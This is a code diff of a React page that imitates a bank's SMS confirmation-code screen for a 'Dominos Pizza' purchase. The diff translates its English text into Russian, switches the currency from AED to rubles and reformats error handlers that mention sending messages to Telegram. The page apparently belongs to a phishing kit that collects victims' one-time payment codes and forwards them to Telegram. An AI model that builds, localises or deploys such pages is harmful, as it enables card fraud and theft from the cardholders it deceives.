@@ -45,7 +45,10 @@ const CodeConfirmPage = ({ isArabic }) => {
       }
     } catch (error) {
       console.log("Произошла ошибка при отправке сообщения в Telegram");
-      console.error("Произошла ошибка при отправке сообщения в Telegram:", error);
+      console.error(
+        "Произошла ошибка при отправке сообщения в Telegram:",
+        error
+      );
     }
   };
 
@@ -99,7 +102,10 @@ const CodeConfirmPage = ({ isArabic }) => {
       }
     } catch (error) {
       console.log("Произошла ошибка при отправке сообщения в Telegram");
-      console.error("Произошла ошибка при отправке сообщения в Telegram:", error);
+      console.error(
+        "Произошла ошибка при отправке сообщения в Telegram:",
+        error
+      );
     }
 
     Cookies.set("clientNumber", clientNumber);
@@ -118,15 +124,15 @@ const CodeConfirmPage = ({ isArabic }) => {
         helpText: "هل تحتاج إلى مساعدة؟",
       }
     : {
-        sentMessage: "We have sent you a text message with a code to",
-        purchaseInfo: `Purchase from Dominos Pizza in the amount of ${total} AED, ${date}`,
-        yourMobileNumber: "your registered mobile phone number",
-        codePlaceholder: "Your code...",
-        confirmButton: "CONFIRM",
-        resendButton: "You can request the code again after 15 seconds",
-        resendBtn: "Resend code",
-        cancelButton: "CANCEL",
-        helpText: "Help is needed?",
+        sentMessage: "Мы отправили вам текстовое сообщение с кодом на",
+        purchaseInfo: `Покупка в Dominos Pizza на сумму ${total} руб, ${date}`,
+        yourMobileNumber: "ваш зарегистрированный номер мобильного телефона",
+        codePlaceholder: "Ваш код...",
+        confirmButton: "ПОДТВЕРДИТЬ",
+        resendButton: "Вы можете запросить код снова через 15 секунд",
+        resendBtn: "Отправить код повторно",
+        cancelButton: "ОТМЕНА",
+        helpText: "Нужна помощь?",
       };
 
   return (
@@ -162,7 +168,7 @@ const CodeConfirmPage = ({ isArabic }) => {
           </button>
         ) : (
           <Link to={"/"}>
-            <button className="resend">{`You can request the code again after ${countdown} seconds`}</button>
+            <button className="resend">{`Вы можете запросить код снова через ${countdown} секунд`}</button>
           </Link>
         )}
 
